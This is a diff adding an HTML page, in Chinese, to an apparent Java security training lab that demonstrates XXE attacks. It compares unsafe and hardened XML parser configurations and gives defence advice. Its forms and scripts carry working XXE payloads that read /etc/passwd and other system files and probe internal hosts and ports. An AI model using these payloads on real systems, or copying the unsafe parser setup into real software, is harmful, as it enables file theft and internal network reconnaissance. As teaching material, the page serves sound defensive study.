@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html lang="zh-CN" xmlns:th="http://www.thymeleaf.org">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>基础XXE攻击演示 - Java Security Lab</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        .code-block { background-color: #f8f9fa; border: 1px solid #dee2e6; font-family: 'Courier New', monospace; }
+        .vulnerable { border-left: 4px solid #dc3545; }
+        .safe { border-left: 4px solid #28a745; }
+        .result-box { min-height: 100px; max-height: 300px; overflow-y: auto; }
+        .payload-item { cursor: pointer; transition: background-color 0.2s; }
+        .payload-item:hover { background-color: #f8f9fa; }
+        .xml-input { font-family: 'Courier New', monospace; }
+    </style>
+</head>
+<body>
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+        <div class="container">
+            <a class="navbar-brand" href="/">Java Security Lab</a>
+            <div class="navbar-nav ms-auto">
+                <a class="nav-link" href="/xxe">XXE首页</a>
+                <a class="nav-link" href="/">返回首页</a>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container mt-4">
+        <div class="row">
+            <div class="col-12">
+                <h2><i class="fas fa-play-circle text-primary"></i> 基础XXE攻击演示</h2>
+                <p class="lead">了解XXE攻击的基本原理，对比安全和不安全的XML解析方式</p>
+            </div>
+        </div>
+
+        <!-- XXE攻击原理说明 -->
+        <div class="row mb-4">
+            <div class="col-12">
+                <div class="card">
+                    <div class="card-header">
+                        <h4><i class="fas fa-info-circle"></i> XXE攻击原理</h4>
+                    </div>
+                    <div class="card-body">
+                        <div class="row">
+                            <div class="col-md-6">
+                                <h6>攻击流程：</h6>
+                                <ol>
+                                    <li>构造包含恶意外部实体的XML</li>
+                                    <li>应用程序解析XML时加载外部实体</li>
+                                    <li>外部实体引用本地文件或网络资源</li>
+                                    <li>获取敏感信息或发起网络请求</li>
+                                </ol>
+                                
+                                <h6>关键要素：</h6>
+                                <ul>
+                                    <li><code>&lt;!DOCTYPE&gt;</code> - 文档类型声明</li>
+                                    <li><code>&lt;!ENTITY&gt;</code> - 实体定义</li>
+                                    <li><code>SYSTEM</code> - 外部实体标识符</li>
+                                    <li><code>&amp;entity;</code> - 实体引用</li>
+                                </ul>
+                            </div>
+                            <div class="col-md-6">
+                                <h6>基本XXE载荷结构：</h6>
+                                <div class="code-block p-3">
+                                    <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE root [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;root&gt;
+  &lt;data&gt;&amp;xxe;&lt;/data&gt;
+&lt;/root&gt;</code></pre>
+                                </div>
+                                
+                                <div class="alert alert-warning mt-3">
+                                    <small><i class="fas fa-exclamation-triangle"></i> 
+                                    当XML解析器处理此载荷时，会尝试读取/etc/passwd文件内容并替换&amp;xxe;实体</small>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 不安全的XML解析演示 -->
+        <div class="row mb-4">
+            <div class="col-md-6">
+                <div class="card vulnerable">
+                    <div class="card-header bg-danger text-white">
+                        <h5><i class="fas fa-exclamation-triangle"></i> 不安全的XML解析</h5>
+                    </div>
+                    <div class="card-body">
+                        <form id="unsafeForm">
+                            <div class="mb-3">
+                                <label for="unsafeXml" class="form-label">XML输入：</label>
+                                <textarea class="form-control xml-input" id="unsafeXml" rows="8" placeholder="输入XML内容...">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE root [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;root&gt;
+  &lt;data&gt;&amp;xxe;&lt;/data&gt;
+&lt;/root&gt;</textarea>
+                            </div>
+                            <button type="submit" class="btn btn-danger">
+                                <i class="fas fa-bug"></i> 执行不安全解析
+                            </button>
+                            <button type="button" class="btn btn-outline-secondary ms-2" onclick="loadUnsafeExample()">
+                                <i class="fas fa-code"></i> 加载示例
+                            </button>
+                        </form>
+                        
+                        <div class="mt-3">
+                            <h6>解析结果：</h6>
+                            <div id="unsafeResult" class="border p-3 result-box bg-light">
+                                <em class="text-muted">等待解析...</em>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="col-md-6">
+                <div class="card safe">
+                    <div class="card-header bg-success text-white">
+                        <h5><i class="fas fa-shield-alt"></i> 安全的XML解析</h5>
+                    </div>
+                    <div class="card-body">
+                        <form id="safeForm">
+                            <div class="mb-3">
+                                <label for="safeXml" class="form-label">XML输入：</label>
+                                <textarea class="form-control xml-input" id="safeXml" rows="8" placeholder="输入XML内容...">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE root [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;root&gt;
+  &lt;data&gt;&amp;xxe;&lt;/data&gt;
+&lt;/root&gt;</textarea>
+                            </div>
+                            <button type="submit" class="btn btn-success">
+                                <i class="fas fa-shield-alt"></i> 执行安全解析
+                            </button>
+                            <button type="button" class="btn btn-outline-secondary ms-2" onclick="loadSafeExample()">
+                                <i class="fas fa-code"></i> 加载示例
+                            </button>
+                        </form>
+                        
+                        <div class="mt-3">
+                            <h6>解析结果：</h6>
+                            <div id="safeResult" class="border p-3 result-box bg-light">
+                                <em class="text-muted">等待解析...</em>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 快速测试按钮 -->
+        <div class="row mb-4">
+            <div class="col-12">
+                <div class="card">
+                    <div class="card-header">
+                        <h5><i class="fas fa-rocket"></i> 快速测试</h5>
+                    </div>
+                    <div class="card-body">
+                        <div class="row">
+                            <div class="col-md-3">
+                                <button class="btn btn-outline-danger w-100 mb-2" onclick="quickTest('file')">
+                                    <i class="fas fa-file"></i> 文件读取测试
+                                </button>
+                            </div>
+                            <div class="col-md-3">
+                                <button class="btn btn-outline-warning w-100 mb-2" onclick="quickTest('network')">
+                                    <i class="fas fa-network-wired"></i> 网络请求测试
+                                </button>
+                            </div>
+                            <div class="col-md-3">
+                                <button class="btn btn-outline-info w-100 mb-2" onclick="quickTest('entity')">
+                                    <i class="fas fa-code"></i> 实体注入测试
+                                </button>
+                            </div>
+                            <div class="col-md-3">
+                                <button class="btn btn-outline-success w-100 mb-2" onclick="quickTest('safe')">
+                                    <i class="fas fa-shield-alt"></i> 安全解析测试
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 常见XXE载荷 -->
+        <div class="row mb-4">
+            <div class="col-12">
+                <div class="card">
+                    <div class="card-header">
+                        <h5><i class="fas fa-bomb"></i> 常见XXE攻击载荷</h5>
+                    </div>
+                    <div class="card-body">
+                        <div class="row">
+                            <div class="col-md-6">
+                                <h6>文件读取载荷：</h6>
+                                <div class="list-group mb-3">
+                                    <div class="list-group-item payload-item" onclick="usePayload('file-passwd')">
+                                        <strong>/etc/passwd 读取</strong><br>
+                                        <small class="text-muted">读取系统用户信息</small>
+                                    </div>
+                                    <div class="list-group-item payload-item" onclick="usePayload('file-hosts')">
+                                        <strong>/etc/hosts 读取</strong><br>
+                                        <small class="text-muted">读取主机映射文件</small>
+                                    </div>
+                                    <div class="list-group-item payload-item" onclick="usePayload('file-proc')">
+                                        <strong>/proc/version 读取</strong><br>
+                                        <small class="text-muted">读取系统版本信息</small>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-md-6">
+                                <h6>网络请求载荷：</h6>
+                                <div class="list-group mb-3">
+                                    <div class="list-group-item payload-item" onclick="usePayload('http-request')">
+                                        <strong>HTTP请求</strong><br>
+                                        <small class="text-muted">发起外部HTTP请求</small>
+                                    </div>
+                                    <div class="list-group-item payload-item" onclick="usePayload('internal-scan')">
+                                        <strong>内网扫描</strong><br>
+                                        <small class="text-muted">扫描内网服务</small>
+                                    </div>
+                                    <div class="list-group-item payload-item" onclick="usePayload('port-scan')">
+                                        <strong>端口探测</strong><br>
+                                        <small class="text-muted">探测开放端口</small>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 代码对比 -->
+        <div class="row mb-4">
+            <div class="col-12">
+                <div class="card">
+                    <div class="card-header">
+                        <h5><i class="fas fa-code"></i> 代码实现对比</h5>
+                    </div>
+                    <div class="card-body">
+                        <div class="row">
+                            <div class="col-md-6">
+                                <h6 class="text-danger"><i class="fas fa-times"></i> 不安全的实现：</h6>
+                                <div class="code-block p-3">
+                                    <pre><code>// 不安全的XML解析器配置
+DocumentBuilderFactory factory = 
+    DocumentBuilderFactory.newInstance();
+
+// 默认配置允许外部实体
+DocumentBuilder builder = factory.newDocumentBuilder();
+Document doc = builder.parse(new InputSource(
+    new StringReader(xmlContent)));
+
+// 直接解析用户输入的XML
+// 可能导致XXE攻击</code></pre>
+                                </div>
+                            </div>
+                            <div class="col-md-6">
+                                <h6 class="text-success"><i class="fas fa-check"></i> 安全的实现：</h6>
+                                <div class="code-block p-3">
+                                    <pre><code>// 安全的XML解析器配置
+DocumentBuilderFactory factory = 
+    DocumentBuilderFactory.newInstance();
+
+// 禁用外部实体
+factory.setFeature(
+    "http://apache.org/xml/features/disallow-doctype-decl", 
+    true);
+factory.setFeature(
+    "http://xml.org/sax/features/external-general-entities", 
+    false);
+factory.setFeature(
+    "http://xml.org/sax/features/external-parameter-entities", 
+    false);
+
+DocumentBuilder builder = factory.newDocumentBuilder();
+Document doc = builder.parse(new InputSource(
+    new StringReader(xmlContent)));</code></pre>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 防护建议 -->
+        <div class="alert alert-success">
+            <h5><i class="fas fa-shield-alt"></i> XXE防护建议</h5>
+            <div class="row">
+                <div class="col-md-6">
+                    <h6>解析器安全配置：</h6>
+                    <ul>
+                        <li>禁用DOCTYPE声明处理</li>
+                        <li>禁用外部通用实体</li>
+                        <li>禁用外部参数实体</li>
+                        <li>禁用XInclude处理</li>
+                        <li>使用安全的XML解析库</li>
+                    </ul>
+                </div>
+                <div class="col-md-6">
+                    <h6>应用层防护：</h6>
+                    <ul>
+                        <li>严格验证XML输入格式</li>
+                        <li>使用XML Schema验证</li>
+                        <li>避免用户控制XML结构</li>
+                        <li>实施网络访问控制</li>
+                        <li>定期更新XML解析库</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+    
+    <script>
+        // 不安全XML解析表单提交
+        document.getElementById('unsafeForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const xmlContent = document.getElementById('unsafeXml').value;
+            
+            if (!xmlContent.trim()) {
+                alert('请输入XML内容');
+                return;
+            }
+            
+            document.getElementById('unsafeResult').innerHTML = '<i class="fas fa-spinner fa-spin"></i> 解析中...';
+            
+            fetch('/xxe/parse/unsafe', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ xmlContent: xmlContent })
+            })
+            .then(response => response.json())
+            .then(data => {
+                const resultDiv = document.getElementById('unsafeResult');
+                if (data.success) {
+                    resultDiv.innerHTML = `
+                        <div class="alert alert-danger">
+                            <h6><i class="fas fa-exclamation-triangle"></i> 解析成功 - 存在XXE漏洞！</h6>
+                            <p><strong>解析结果：</strong></p>
+                            <pre class="mb-0">${data.result || '无内容返回'}</pre>
+                        </div>
+                        <small class="text-muted">解析时间: ${data.parseTime}ms | 内容长度: ${data.contentLength}</small>
+                    `;
+                } else {
+                    resultDiv.innerHTML = `
+                        <div class="alert alert-warning">
+                            <h6><i class="fas fa-exclamation-circle"></i> 解析失败</h6>
+                            <p><strong>错误信息：</strong> ${data.error}</p>
+                        </div>
+                    `;
+                }
+            })
+            .catch(error => {
+                document.getElementById('unsafeResult').innerHTML = `
+                    <div class="alert alert-danger">
+                        <h6><i class="fas fa-times"></i> 请求失败</h6>
+                        <p>错误: ${error}</p>
+                    </div>
+                `;
+            });
+        });
+        
+        // 安全XML解析表单提交
+        document.getElementById('safeForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const xmlContent = document.getElementById('safeXml').value;
+            
+            if (!xmlContent.trim()) {
+                alert('请输入XML内容');
+                return;
+            }
+            
+            document.getElementById('safeResult').innerHTML = '<i class="fas fa-spinner fa-spin"></i> 解析中...';
+            
+            fetch('/xxe/parse/safe', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ xmlContent: xmlContent })
+            })
+            .then(response => response.json())
+            .then(data => {
+                const resultDiv = document.getElementById('safeResult');
+                if (data.success) {
+                    resultDiv.innerHTML = `
+                        <div class="alert alert-success">
+                            <h6><i class="fas fa-shield-alt"></i> 安全解析成功</h6>
+                            <p><strong>解析结果：</strong></p>
+                            <pre class="mb-0">${data.result || '无内容返回'}</pre>
+                        </div>
+                        <small class="text-muted">解析时间: ${data.parseTime}ms | 安全检查: 已启用</small>
+                    `;
+                } else {
+                    resultDiv.innerHTML = `
+                        <div class="alert alert-info">
+                            <h6><i class="fas fa-shield-alt"></i> 安全防护生效</h6>
+                            <p><strong>拦截原因：</strong> ${data.error}</p>
+                            <p class="mb-0"><small>安全配置阻止了潜在的XXE攻击</small></p>
+                        </div>
+                    `;
+                }
+            })
+            .catch(error => {
+                document.getElementById('safeResult').innerHTML = `
+                    <div class="alert alert-danger">
+                        <h6><i class="fas fa-times"></i> 请求失败</h6>
+                        <p>错误: ${error}</p>
+                    </div>
+                `;
+            });
+        });
+        
+        // 快速测试
+        function quickTest(type) {
+            let xmlContent = '';
+            let targetField = 'unsafeXml';
+            
+            switch(type) {
+                case 'file':
+                    xmlContent = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>
+  <data>&xxe;</data>
+</root>`;
+                    break;
+                case 'network':
+                    xmlContent = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "http://httpbin.org/get">
+]>
+<root>
+  <data>&xxe;</data>
+</root>`;
+                    break;
+                case 'entity':
+                    xmlContent = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY xxe "恶意实体内容">
+]>
+<root>
+  <data>&xxe;</data>
+</root>`;
+                    break;
+                case 'safe':
+                    xmlContent = `<?xml version="1.0" encoding="UTF-8"?>
+<root>
+  <data>正常的XML内容</data>
+</root>`;
+                    targetField = 'safeXml';
+                    break;
+            }
+            
+            document.getElementById(targetField).value = xmlContent;
+            
+            if (type === 'safe') {
+                document.getElementById('safeForm').dispatchEvent(new Event('submit'));
+            } else {
+                document.getElementById('unsafeForm').dispatchEvent(new Event('submit'));
+            }
+        }
+        
+        // 使用载荷
+        function usePayload(type) {
+            let xmlContent = '';
+            
+            switch(type) {
+                case 'file-passwd':
+                    xmlContent = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>
+  <data>&xxe;</data>
+</root>`;
+                    break;
+                case 'file-hosts':
+                    xmlContent = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/hosts">
+]>
+<root>
+  <data>&xxe;</data>
+</root>`;
+                    break;
+                case 'file-proc':
+                    xmlContent = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///proc/version">
+]>
+<root>
+  <data>&xxe;</data>
+</root>`;
+                    break;
+                case 'http-request':
+                    xmlContent = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "http://httpbin.org/get">
+]>
+<root>
+  <data>&xxe;</data>
+</root>`;
+                    break;
+                case 'internal-scan':
+                    xmlContent = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "http://127.0.0.1:22">
+]>
+<root>
+  <data>&xxe;</data>
+</root>`;
+                    break;
+                case 'port-scan':
+                    xmlContent = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "http://localhost:8080">
+]>
+<root>
+  <data>&xxe;</data>
+</root>`;
+                    break;
+            }
+            
+            document.getElementById('unsafeXml').value = xmlContent;
+            document.getElementById('safeXml').value = xmlContent;
+        }
+        
+        // 加载示例
+        function loadUnsafeExample() {
+            fetch('/xxe/example/unsafe')
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    document.getElementById('unsafeXml').value = data.xmlExample;
+                } else {
+                    alert('加载示例失败: ' + data.error);
+                }
+            })
+            .catch(error => {
+                alert('加载示例失败: ' + error);
+            });
+        }
+        
+        function loadSafeExample() {
+            fetch('/xxe/example/safe')
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    document.getElementById('safeXml').value = data.xmlExample;
+                } else {
+                    alert('加载示例失败: ' + data.error);
+                }
+            })
+            .catch(error => {
+                alert('加载示例失败: ' + error);
+            });
+        }
+    </script>
+</body>
+</html>
